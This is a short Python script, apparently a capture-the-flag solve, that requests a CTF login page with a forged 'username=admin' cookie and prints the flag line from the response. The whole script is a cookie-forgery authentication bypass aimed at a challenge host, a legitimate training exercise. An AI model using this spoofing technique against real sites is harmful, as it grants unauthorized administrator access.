import requests

url = 'https://login.ctf.ptr.si'
cookies = {'username': 'admin'}
r = requests.get(url, cookies=cookies)
for line in r.text.split('\n'):
    if 'ptr{' in line:
        print(line.strip())
